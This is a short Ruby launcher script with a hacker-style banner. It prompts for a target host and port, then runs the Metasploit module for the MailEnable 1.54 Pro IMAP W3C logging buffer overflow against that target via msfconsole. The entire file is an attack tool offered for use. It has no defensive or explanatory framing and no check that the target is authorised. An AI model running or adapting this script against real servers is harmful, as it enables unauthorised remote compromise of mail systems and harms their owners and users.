require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
     MailEnable IMAPD W3C Logging Buffer Overflow

		     MailEnable 1.54 Pro Universal
""".red
puts """
	 1st Try {set RPORT 143; 2nd RPORT ?}""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? [Default 143]".blue
print " [!] ---> ".yellow
port = gets.chomp







exec("msfconsole -x 'use exploit/windows/imap/mailenable_w3c_select' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

